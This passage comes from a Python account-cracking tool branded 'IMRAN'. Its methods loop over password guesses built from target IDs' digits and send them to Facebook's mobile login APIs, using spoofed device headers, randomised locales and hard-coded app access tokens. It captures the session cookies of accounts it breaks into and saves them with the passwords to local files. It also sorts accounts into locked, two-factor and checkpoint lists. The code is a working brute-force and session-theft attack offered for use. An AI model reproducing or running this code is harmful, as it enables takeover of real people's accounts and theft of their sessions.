				__locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR","en_AU":"AU","en_CA":"CA","en_IN":"IN","es_LA":"LA","fr_CA":"CA","th_TH":"TH","tr_TR":"TR","pl_PL":"PL","nl_NL":"NL","da_DK":"DK","fi_FI":"FI","sv_SE":"SE","nb_NO":"NO","cs_CZ":"CZ","hu_HU":"HU","el_GR":"GR","ro_RO":"RO","sk_SK":"SK","bg_BG":"BG","uk_UA":"UA","hr_HR":"HR","lt_LT":"LT","lv_LV":"LV","et_EE":"EE","sr_RS":"RS","sl_SI":"SI","he_IL":"IL","hi_IN":"IN","ms_MY":"MY","id_ID":"ID","vi_VN":"VN","tl_PH":"PH","bn_IN":"IN","pa_IN":"IN","gu_IN":"IN","ta_IN":"IN","te_IN":"IN","ml_IN":"IN","kn_IN":"IN","mr_IN":"IN","or_IN":"IN","as_IN":"IN","ne_NP":"NP","si_LK":"LK","my_MM":"MM","km_KH":"KH","lo_LA":"LA","mn_MN":"MN","kmr_TR":"TR","ku_TR":"TR","bs_BA":"BA","sq_AL":"AL","mk_MK":"MK","mt_MT":"MT","cy_GB":"GB","gd_GB":"GB","ga_IE":"IE","eu_ES":"ES","gl_ES":"ES","ca_ES":"ES","ast_ES":"ES","oc_FR":"FR","br_FR":"FR","co_FR":"FR","rm_CH":"CH","wa_BE":"BE","lb_LU":"LU","mo_MD":"MD","be_BY":"BY","uz_UZ":"UZ","tk_TM":"TM","kk_KZ":"KZ","ky_KG":"KG","tg_TJ":"TJ","az_AZ":"AZ","hy_AM":"AM","ka_GE":"GE","af_ZA":"ZA","xh_ZA":"ZA","zu_ZA":"ZA","sw_KE":"KE","am_ET":"ET","ti_ET":"ET","so_SO":"SO","om_ET":"ET","rn_BI":"BI","rw_RW":"RW","mg_MG":"MG","ha_NG":"NG","ig_NG":"NG","yo_NG":"NG","qu_PE":"PE","ay_PE":"PE","gn_PY":"PY","dz_BT":"BT","bo_CN":"CN","ug_CN":"CN","wo_SN":"SN","yo_BJ":"BJ","ar_DZ":"DZ","ar_EG":"EG","ar_IQ":"IQ","ar_JO":"JO","ar_KW":"KW","ar_LB":"LB","ar_LY":"LY","ar_MA":"MA","ar_OM":"OM","ar_QA":"QA","ar_SA":"SA","ar_SD":"SD","ar_SY":"SY","ar_TN":"TN","ar_AE":"AE","ar_YE":"YE","fa_IR":"IR","ps_AF":"AF","ur_PK":"PK","sd_PK":"PK","pa_PK":"PK","si_LK":"LK","bn_BD":"BD","ta_LK":"LK","ta_MY":"MY","ta_SG":"SG","zh_HK":"HK","zh_MO":"MO","zh_SG":"SG","zh_TW":"TW","my_MM":"MM","ms_BN":"BN","ms_SG":"SG","th_TH":"TH","lo_LA":"LA","km_KH":"KH","vi_VN":"VN","id_ID":"ID","jv_ID":"ID","su_ID":"ID","tl_PH":"PH","fil_PH":"PH","ceb_PH":"PH","war_PH":"PH","en_BZ":"BZ","es_MX":"MX","es_GT":"GT","es_CR":"CR","es_PA":"PA","es_DO":"DO","es_VE":"VE","es_CO":"CO","es_PE":"PE","es_EC":"EC","es_CL":"CL","es_AR":"AR","es_UY":"UY","es_PY":"PY","es_BO":"BO","es_HN":"HN","es_NI":"NI","es_PR":"PR","fr_BE":"BE","fr_CH":"CH","fr_LU":"LU","fr_MC":"MC","de_AT":"AT","de_CH":"CH","de_LU":"LU","de_LI":"LI","it_CH":"CH","nl_BE":"BE","fi_AX":"AX","se_SE":"SE","is_IS":"IS","fo_FO":"FO","kl_GL":"GL","en_NZ":"NZ","en_ZA":"ZA","en_JM":"JM","en_BW":"BW","en_NA":"NA","en_ZM":"ZM","en_MW":"MW","en_UG":"UG","en_KE":"KE","en_TZ":"TZ"}
				country_locale = random.choice(list(__locale__.keys()))
				country_code = __locale__[country_locale]
				random_seed = random.Random()
				adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
				device_id = str(uuid.uuid4())
				data = {"adid": adid,"format": "json","device_id": device_id,"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": str(ids),"password": f"#{pax}:0:{int(time.time())}:{pas}","access_token": f"{accessToken}","generate_session_cookies": "1","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": country_locale,"client_country_code": country_code,"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": random.choice(["com.facebook.auth.login.AuthOperations$PasswordAuthOperation","com.facebook.account.login.protocol.Fb4aAuthHandler","graphservice","Fb4aAuthHandler","com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"]),"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {"User-Agent": ua,"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","Content-Type": "application/x-www-form-urlencoded","Host": "b-graph.facebook.com","X-FB-Net-HNI": str(random.randint(11111, 99999)),"X-FB-SIM-HNI": str(random.randint(11111, 99999)),"X-FB-Connection-Type": random.choice(["CELL.3G","WIFI","MOBILE.LTE","unknown"]),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": str(random.randint(1000,9999)),"X-FB-Friendly-Name": random.choice(["ViewerReactionsMutation","authenticate"]),"X-FB-Request-Analytics-Tags": random.choice(["unknown","graphservice"]),"X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
				twf = "Login approvals are on. Expect an SMS shortly with a code to use for log in"
				po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False,verify=True).json()
				if 'session_key' in po:
					uid = po['uid']
					session = po['session_cookies'];cookiex = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookiex+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookiex+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookiex+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookiex+=datr+f';dpr={dprx};locale={country_locale};wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookiex+=pagevoice;ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-');cookie = f'sb={ssbb};{cookiex}'
					colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
					res = str(requests.get(f'https://graph.facebook.com/{str(uid)}/picture?type=normal').text)
					if 'Photoshop' in res:
						print(f"\r{G}[IMRAN-Ok]{W} {G}{str(uid)}{W} {G}|{W} {G}{pas}{W} ")
						if 'y' in self.cokiex:
							print(f"\r[Cookie-🍪] {colorX} {cookie}{W}\n ")
						open('/sdcard/IMRAN-Random-M2-OK.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')
						self.oks.append(str(uid))
						break
					else:
						if 'y' in self.cp2f:
							print(f"\r{Y}[IMRAN-LK]{W} {Y}{str(uid)}{W} {Y}|{W} {Y}{pas}{W} ")
						open('/sdcard/IMRAN-Random-M2-lk.txt','a').write(str(uid)+'|'+pas+'\n')
						self.lks.append(str(uid))
						break
				if twf in str(po):
					uid = po['error']['error_data']['uid']
					if 'y' in self.cp2f:
						print(f"\r{X}[IMRAN-2F]{W} {X}{str(uid)}{W} {X}|{W} {X}{pas}{W} ")
					open('/sdcard/IMRAN-Random-M2-2F.txt','a').write(str(uid)+'|'+pas+'\n')
					self.twf.append(str(uid))
					break
				if 'www.facebook.com' in po['error']['message']:
					uid = po['error']['error_data']['uid']
					if 'y' in self.cp2f:
						print(f"\r{R}[IMRAN-CP]{W} {R}{str(uid)}{W} {R}|{W} {R}{pas}{W} ")
					open('/sdcard/IMRAN-Random-M2-CP.txt','a').write(str(uid)+'|'+pas+'\n')
					self.cps.append(str(uid))
					break
				else:
					continue
			self.loop+=1
		except requests.exceptions.Timeout:
			sleep(31)
		except requests.exceptions.ConnectionError:
			sleep(31)
		except Exception as e:
			pass

	def __rn_api__(self,ids,passlist) -> None:
		try:
			global loop
			sys.stdout.write(f"\r[IMRAN]―[M3/{self.loop}]-[{G}{len(self.oks)}{W}|{Y}{len(self.lks)}{W}|{X}{len(self.twf)}{W}|{R}{len(self.cps)}{W}] ")
			sys.stdout.flush()
			for pw in passlist:
				pas = pw.replace("first6",ids[:6]).replace("First6",ids[:6]).replace("first7",ids[:7]).replace("First7",ids[:7]).replace("first8",ids[:8]).replace("First8",ids[:8]).replace("first9",ids[:9]).replace("First9",ids[:9]).replace("first10",ids[:10]).replace("First10",ids[:10]).replace("number",ids).replace("Number",ids).replace("last6",ids[-6:]).replace("Last6",ids[-6:]).replace("last7",ids[-7:]).replace("Last7",ids[-7:]).replace("last8",ids[-8:]).replace("Last8",ids[-8:]).replace("last9",ids[-9:]).replace("Last9",ids[-9:]).replace("last10",ids[-10:]).replace("Last10",ids[-10:])
				ua = ___UPA___()
				accessToken = random.choice(["350685531728|62f8ce9f74b12f84c123cc23437a4a32","350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","256002347743983|374e60f8b9bb6b8cbb30f78030438895","275254692598279|585aec5b4c27376758abb7ffcb9db2af","6628568379|c1e620fa708a1d5696fb991c1bde5662"])
				pax = random.choice(["PWD_FB4A","PWD_BROWSER","PWD_MSGR","PWD_REACTNATIVE","PWD_ENC"])
				dprx = random.choice(['1','2','3'])
				__locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR","en_AU":"AU","en_CA":"CA","en_IN":"IN","es_LA":"LA","fr_CA":"CA","th_TH":"TH","tr_TR":"TR","pl_PL":"PL","nl_NL":"NL","da_DK":"DK","fi_FI":"FI","sv_SE":"SE","nb_NO":"NO","cs_CZ":"CZ","hu_HU":"HU","el_GR":"GR","ro_RO":"RO","sk_SK":"SK","bg_BG":"BG","uk_UA":"UA","hr_HR":"HR","lt_LT":"LT","lv_LV":"LV","et_EE":"EE","sr_RS":"RS","sl_SI":"SI","he_IL":"IL","hi_IN":"IN","ms_MY":"MY","id_ID":"ID","vi_VN":"VN","tl_PH":"PH","bn_IN":"IN","pa_IN":"IN","gu_IN":"IN","ta_IN":"IN","te_IN":"IN","ml_IN":"IN","kn_IN":"IN","mr_IN":"IN","or_IN":"IN","as_IN":"IN","ne_NP":"NP","si_LK":"LK","my_MM":"MM","km_KH":"KH","lo_LA":"LA","mn_MN":"MN","kmr_TR":"TR","ku_TR":"TR","bs_BA":"BA","sq_AL":"AL","mk_MK":"MK","mt_MT":"MT","cy_GB":"GB","gd_GB":"GB","ga_IE":"IE","eu_ES":"ES","gl_ES":"ES","ca_ES":"ES","ast_ES":"ES","oc_FR":"FR","br_FR":"FR","co_FR":"FR","rm_CH":"CH","wa_BE":"BE","lb_LU":"LU","mo_MD":"MD","be_BY":"BY","uz_UZ":"UZ","tk_TM":"TM","kk_KZ":"KZ","ky_KG":"KG","tg_TJ":"TJ","az_AZ":"AZ","hy_AM":"AM","ka_GE":"GE","af_ZA":"ZA","xh_ZA":"ZA","zu_ZA":"ZA","sw_KE":"KE","am_ET":"ET","ti_ET":"ET","so_SO":"SO","om_ET":"ET","rn_BI":"BI","rw_RW":"RW","mg_MG":"MG","ha_NG":"NG","ig_NG":"NG","yo_NG":"NG","qu_PE":"PE","ay_PE":"PE","gn_PY":"PY","dz_BT":"BT","bo_CN":"CN","ug_CN":"CN","wo_SN":"SN","yo_BJ":"BJ","ar_DZ":"DZ","ar_EG":"EG","ar_IQ":"IQ","ar_JO":"JO","ar_KW":"KW","ar_LB":"LB","ar_LY":"LY","ar_MA":"MA","ar_OM":"OM","ar_QA":"QA","ar_SA":"SA","ar_SD":"SD","ar_SY":"SY","ar_TN":"TN","ar_AE":"AE","ar_YE":"YE","fa_IR":"IR","ps_AF":"AF","ur_PK":"PK","sd_PK":"PK","pa_PK":"PK","si_LK":"LK","bn_BD":"BD","ta_LK":"LK","ta_MY":"MY","ta_SG":"SG","zh_HK":"HK","zh_MO":"MO","zh_SG":"SG","zh_TW":"TW","my_MM":"MM","ms_BN":"BN","ms_SG":"SG","th_TH":"TH","lo_LA":"LA","km_KH":"KH","vi_VN":"VN","id_ID":"ID","jv_ID":"ID","su_ID":"ID","tl_PH":"PH","fil_PH":"PH","ceb_PH":"PH","war_PH":"PH","en_BZ":"BZ","es_MX":"MX","es_GT":"GT","es_CR":"CR","es_PA":"PA","es_DO":"DO","es_VE":"VE","es_CO":"CO","es_PE":"PE","es_EC":"EC","es_CL":"CL","es_AR":"AR","es_UY":"UY","es_PY":"PY","es_BO":"BO","es_HN":"HN","es_NI":"NI","es_PR":"PR","fr_BE":"BE","fr_CH":"CH","fr_LU":"LU","fr_MC":"MC","de_AT":"AT","de_CH":"CH","de_LU":"LU","de_LI":"LI","it_CH":"CH","nl_BE":"BE","fi_AX":"AX","se_SE":"SE","is_IS":"IS","fo_FO":"FO","kl_GL":"GL","en_NZ":"NZ","en_ZA":"ZA","en_JM":"JM","en_BW":"BW","en_NA":"NA","en_ZM":"ZM","en_MW":"MW","en_UG":"UG","en_KE":"KE","en_TZ":"TZ"}
				country_locale = random.choice(list(__locale__.keys()))
				country_code = __locale__[country_locale]
				random_seed = random.Random()
				adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
				device_id = str(uuid.uuid4())
				data = {"adid": adid,"format": "json","device_id": device_id,"email": str(ids),"password": f"#{pax}:0:{int(time.time())}:{pas}","generate_analytics_claims": "1","community_id": "","cpl": "true", "try_num": "1","family_device_id": str(uuid.uuid4()),"credentials_type": "password","source": "login", "error_detail_type": "button_with_disabled","enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1", "currently_logged_in_userid": "0","locale": country_locale,"client_country_code": country_code,"fb_api_req_friendly_name": "authenticate",}
				headers = {"User-Agent": ua,"Accept-Encoding":  "gzip, deflate", "Accept": "*/*","Connection": "keep-alive","Authorization": f"OAuth {accessToken}","X-FB-Friendly-Name": random.choice(["ViewerReactionsMutation","authenticate"]),"X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),"X-FB-Net-HNI": str(random.randint(20000, 60000)),"X-FB-SIM-HNI": str(random.randint(20000, 60000)),"X-FB-Connection-Type": random.choice(["CELL.3G","WIFI","MOBILE.LTE","cell.CTRadioAccessTechnologyHSDPA","unknown"]),"Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger",}
				twf = "Login approvals are on. Expect an SMS shortly with a code to use for log in"
				po = requests.post("https://api.facebook.com/method/auth.login",data=data,headers=headers,allow_redirects=False,verify=True).json()
				if 'session_key' in po:
					uid = po['uid']
					session = po['session_cookies'];cookiex = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookiex+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookiex+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookiex+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookiex+=datr+f';dpr={dprx};locale={country_locale};wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookiex+=pagevoice;ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-');cookie = f'sb={ssbb};{cookiex}'
					colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
					res = str(requests.get(f'https://graph.facebook.com/{str(uid)}/picture?type=normal').text)
					if 'Photoshop' in res:
						print(f"\r{G}[IMRAN-Ok]{W} {G}{str(uid)}{W} {G}|{W} {G}{pas}{W} ")
						if 'y' in self.cokiex:
							print(f"\r[Cookie-🍪] {colorX} {cookie}{W}\n ")
						open('/sdcard/IMRAN-Random-M3-OK.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')
						self.oks.append(str(uid))
						break
					else:
						if 'y' in self.cp2f:
							print(f"\r{Y}[IMRAN-LK]{W} {Y}{str(uid)}{W} {Y}|{W} {Y}{pas}{W} ")
						open('/sdcard/IMRAN-Random-M3-lk.txt','a').write(str(uid)+'|'+pas+'\n')
						self.lks.append(str(uid))
						break
				if twf in str(po):
					uid = po['error']['error_data']['uid']
					if 'y' in self.cp2f:
						print(f"\r{X}[IMRAN-2F]{W} {X}{str(uid)}{W} {X}|{W} {X}{pas}{W} ")
					open('/sdcard/IMRAN-Random-M3-2F.txt','a').write(str(uid)+'|'+pas+'\n')
					self.twf.append(str(uid))
					break
				if "www.facebook.com" in po["error_msg"]:
					uid = po['error']['error_data']['uid']
					if 'y' in self.cp2f:
						print(f"\r{R}[IMRAN-CP]{W} {R}{str(uid)}{W} {R}|{W} {R}{pas}{W} ")
					open('/sdcard/IMRAN-Random-M3-CP.txt','a').write(str(uid)+'|'+pas+'\n')
					self.cps.append(str(uid))
					break
				else:
					continue
			self.loop+=1
		except requests.exceptions.Timeout:
			sleep(31)
		except requests.exceptions.ConnectionError:
			sleep(31)
		except Exception as e:
			pass

	def __rn_bapi__(self,ids,passlist) -> None:
		try:
			global loop
			sys.stdout.write(f"\r[IMRAN]―[M4/{self.loop}]-[{G}{len(self.oks)}{W}|{Y}{len(self.lks)}{W}|{X}{len(self.twf)}{W}|{R}{len(self.cps)}{W}] ")
			sys.stdout.flush()
			for pw in passlist:
				pas = pw.replace("first6",ids[:6]).replace("First6",ids[:6]).replace("first7",ids[:7]).replace("First7",ids[:7]).replace("first8",ids[:8]).replace("First8",ids[:8]).replace("first9",ids[:9]).replace("First9",ids[:9]).replace("first10",ids[:10]).replace("First10",ids[:10]).replace("number",ids).replace("Number",ids).replace("last6",ids[-6:]).replace("Last6",ids[-6:]).replace("last7",ids[-7:]).replace("Last7",ids[-7:]).replace("last8",ids[-8:]).replace("Last8",ids[-8:]).replace("last9",ids[-9:]).replace("Last9",ids[-9:]).replace("last10",ids[-10:]).replace("Last10",ids[-10:])
				ua = ___UPA___()
				accessToken = random.choice(["350685531728|62f8ce9f74b12f84c123cc23437a4a32","350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","256002347743983|374e60f8b9bb6b8cbb30f78030438895","275254692598279|585aec5b4c27376758abb7ffcb9db2af","6628568379|c1e620fa708a1d5696fb991c1bde5662"])
				pax = random.choice(["PWD_FB4A","PWD_BROWSER","PWD_MSGR","PWD_REACTNATIVE","PWD_ENC"])
				dprx = random.choice(['1','2','3'])
				__locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR","en_AU":"AU","en_CA":"CA","en_IN":"IN","es_LA":"LA","fr_CA":"CA","th_TH":"TH","tr_TR":"TR","pl_PL":"PL","nl_NL":"NL","da_DK":"DK","fi_FI":"FI","sv_SE":"SE","nb_NO":"NO","cs_CZ":"CZ","hu_HU":"HU","el_GR":"GR","ro_RO":"RO","sk_SK":"SK","bg_BG":"BG","uk_UA":"UA","hr_HR":"HR","lt_LT":"LT","lv_LV":"LV","et_EE":"EE","sr_RS":"RS","sl_SI":"SI","he_IL":"IL","hi_IN":"IN","ms_MY":"MY","id_ID":"ID","vi_VN":"VN","tl_PH":"PH","bn_IN":"IN","pa_IN":"IN","gu_IN":"IN","ta_IN":"IN","te_IN":"IN","ml_IN":"IN","kn_IN":"IN","mr_IN":"IN","or_IN":"IN","as_IN":"IN","ne_NP":"NP","si_LK":"LK","my_MM":"MM","km_KH":"KH","lo_LA":"LA","mn_MN":"MN","kmr_TR":"TR","ku_TR":"TR","bs_BA":"BA","sq_AL":"AL","mk_MK":"MK","mt_MT":"MT","cy_GB":"GB","gd_GB":"GB","ga_IE":"IE","eu_ES":"ES","gl_ES":"ES","ca_ES":"ES","ast_ES":"ES","oc_FR":"FR","br_FR":"FR","co_FR":"FR","rm_CH":"CH","wa_BE":"BE","lb_LU":"LU","mo_MD":"MD","be_BY":"BY","uz_UZ":"UZ","tk_TM":"TM","kk_KZ":"KZ","ky_KG":"KG","tg_TJ":"TJ","az_AZ":"AZ","hy_AM":"AM","ka_GE":"GE","af_ZA":"ZA","xh_ZA":"ZA","zu_ZA":"ZA","sw_KE":"KE","am_ET":"ET","ti_ET":"ET","so_SO":"SO","om_ET":"ET","rn_BI":"BI","rw_RW":"RW","mg_MG":"MG","ha_NG":"NG","ig_NG":"NG","yo_NG":"NG","qu_PE":"PE","ay_PE":"PE","gn_PY":"PY","dz_BT":"BT","bo_CN":"CN","ug_CN":"CN","wo_SN":"SN","yo_BJ":"BJ","ar_DZ":"DZ","ar_EG":"EG","ar_IQ":"IQ","ar_JO":"JO","ar_KW":"KW","ar_LB":"LB","ar_LY":"LY","ar_MA":"MA","ar_OM":"OM","ar_QA":"QA","ar_SA":"SA","ar_SD":"SD","ar_SY":"SY","ar_TN":"TN","ar_AE":"AE","ar_YE":"YE","fa_IR":"IR","ps_AF":"AF","ur_PK":"PK","sd_PK":"PK","pa_PK":"PK","si_LK":"LK","bn_BD":"BD","ta_LK":"LK","ta_MY":"MY","ta_SG":"SG","zh_HK":"HK","zh_MO":"MO","zh_SG":"SG","zh_TW":"TW","my_MM":"MM","ms_BN":"BN","ms_SG":"SG","th_TH":"TH","lo_LA":"LA","km_KH":"KH","vi_VN":"VN","id_ID":"ID","jv_ID":"ID","su_ID":"ID","tl_PH":"PH","fil_PH":"PH","ceb_PH":"PH","war_PH":"PH","en_BZ":"BZ","es_MX":"MX","es_GT":"GT","es_CR":"CR","es_PA":"PA","es_DO":"DO","es_VE":"VE","es_CO":"CO","es_PE":"PE","es_EC":"EC","es_CL":"CL","es_AR":"AR","es_UY":"UY","es_PY":"PY","es_BO":"BO","es_HN":"HN","es_NI":"NI","es_PR":"PR","fr_BE":"BE","fr_CH":"CH","fr_LU":"LU","fr_MC":"MC","de_AT":"AT","de_CH":"CH","de_LU":"LU","de_LI":"LI","it_CH":"CH","nl_BE":"BE","fi_AX":"AX","se_SE":"SE","is_IS":"IS","fo_FO":"FO","kl_GL":"GL","en_NZ":"NZ","en_ZA":"ZA","en_JM":"JM","en_BW":"BW","en_NA":"NA","en_ZM":"ZM","en_MW":"MW","en_UG":"UG","en_KE":"KE","en_TZ":"TZ"}
				country_locale = random.choice(list(__locale__.keys()))
				country_code = __locale__[country_locale]
				random_seed = random.Random()
				adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
				device_id = str(uuid.uuid4())
				data = {"adid": adid,"format": "json","device_id": device_id,"email": str(ids),"password": f"#{pax}:0:{int(time.time())}:{pas}","generate_analytics_claim": "1","cpl": "true","try_num": "1","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","generate_session_cookies": "1","error_detail_type": "button_with_disabled","source": "device_based_login","machine_id": str(uuid.uuid4()),"login_location_accuracy_m": "1.0","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": country_locale,"client_country_code": country_code,"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": random.choice(["com.facebook.auth.login.AuthOperations$PasswordAuthOperation","com.facebook.account.login.protocol.Fb4aAuthHandler","graphservice","Fb4aAuthHandler","com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"]),"access_token": f"{accessToken}"}
				headers = {"user-agent": ua,"accept-encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","content-type": "application/x-www-form-urlencoded","x-fb-sim-hni": str(random.randint(900000, 999999)),"x-fb-connection-type": random.choice(["CELL.3G","WIFI","MOBILE.LTE","cell.CTRadioAccessTechnologyHSDPA","unknown"]),"Authorization": f"OAuth {accessToken}","x-fb-net-hni": str(random.randint(900000, 999999)),"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),"x-fb-connection-quality": random.choice(["GOOD","MODERATE","EXCELLENT","POOR"]),"x-fb-friendly-name": random.choice(["ViewerReactionsMutation","authenticate"]),"x-fb-http-engine": "Liger"}
				twf = "Login approvals are on. Expect an SMS shortly with a code to use for log in"
				po = requests.post("https://b-api.facebook.com/method/auth.login",data=data,headers=headers,allow_redirects=False,verify=True).json()
				if 'session_key' in po:
					uid = po['uid']
					session = po['session_cookies'];cookiex = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookiex+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookiex+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookiex+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookiex+=datr+f';dpr={dprx};locale={country_locale};wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookiex+=pagevoice;ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-');cookie = f'sb={ssbb};{cookiex}'
					colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
					res = str(requests.get(f'https://graph.facebook.com/{str(uid)}/picture?type=normal').text)
					if 'Photoshop' in res:
						print(f"\r{G}[IMRAN-Ok]{W} {G}{str(uid)}{W} {G}|{W} {G}{pas}{W} ")
						if 'y' in self.cokiex:
							print(f"\r[Cookie-🍪] {colorX} {cookie}{W}\n ")
						open('/sdcard/IMRAN-Random-M4-OK.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')
						self.oks.append(str(uid))
						break
					else:
						if 'y' in self.cp2f:
							print(f"\r{Y}[IMRAN-LK]{W} {Y}{str(uid)}{W} {Y}|{W} {Y}{pas}{W} ")
						open('/sdcard/IMRAN-Random-M4-lk.txt','a').write(str(uid)+'|'+pas+'\n')
						self.lks.append(str(uid))
						break
				if twf in str(po):
					uid = po['error']['error_data']['uid']
					if 'y' in self.cp2f:
						print(f"\r{X}[IMRAN-2F]{W} {X}{str(uid)}{W} {X}|{W} {X}{pas}{W} ")
					open('/sdcard/IMRAN-Random-M4-2F.txt','a').write(str(uid)+'|'+pas+'\n')
					self.twf.append(str(uid))
					break
				if "www.facebook.com" in po["error_msg"]:
					uid = po['error']['error_data']['uid']
					if 'y' in self.cp2f:
						print(f"\r{R}[IMRAN-CP]{W} {R}{str(uid)}{W} {R}|{W} {R}{pas}{W} ")
					open('/sdcard/IMRAN-Random-M4-CP.txt','a').write(str(uid)+'|'+pas+'\n')
					self.cps.append(str(uid))
					break
				else:
					continue
			self.loop+=1
		except requests.exceptions.Timeout:
			sleep(31)
		except requests.exceptions.ConnectionError:
			sleep(31)
		except Exception as e:
			pass

	def __rn_host__(self,ids,passlist) -> None:
		try:
			global loop
			sys.stdout.write(f"\r[IMRAN]―[M5/{self.loop}]-[{G}{len(self.oks)}{W}|{Y}{len(self.lks)}{W}|{R}{len(self.cps)}{W}] ")
			sys.stdout.flush()
			for pw in passlist:
				pas = pw.replace("first6",ids[:6]).replace("First6",ids[:6]).replace("first7",ids[:7]).replace("First7",ids[:7]).replace("first8",ids[:8]).replace("First8",ids[:8]).replace("first9",ids[:9]).replace("First9",ids[:9]).replace("first10",ids[:10]).replace("First10",ids[:10]).replace("number",ids).replace("Number",ids).replace("last6",ids[-6:]).replace("Last6",ids[-6:]).replace("last7",ids[-7:]).replace("Last7",ids[-7:]).replace("last8",ids[-8:]).replace("Last8",ids[-8:]).replace("last9",ids[-9:]).replace("Last9",ids[-9:]).replace("last10",ids[-10:]).replace("Last10",ids[-10:])
				session = requests.Session()
				ua = ___UAH___()
				pax = random.choice(["PWD_FB4A","PWD_BROWSER","PWD_MSGR","PWD_REACTNATIVE","PWD_ENC"])
				dprx = random.choice(['1','2','3'])
				link = session.get('https://mbasic.facebook.com/').text
				data = {'__aaid': '0','__user': '0','__a': '1','__req': random.choice(string.digits+string.ascii_lowercase),'__hs': '20466.BP:wbloks_caa_pkg.2.0...0','dpr': random.choice(['1','2','3']),'__ccg': random.choice(["GOOD","MODERATE","EXCELLENT"]),'__rev': str(random.randint(1000000000,1999999999)),"__s": ''.join(''.join(random.choices(string.ascii_lowercase, k=6)) for _ in range(3)),'__hsi': str(int(time.time() * 10000000)),'__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw','fb_dtsg': 'NAftoWe6QwGhG8g-1HXIEQnyUHiBsZsOUv_dF1spCQ9ROcforDEvbKg:0:0','jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),'params': 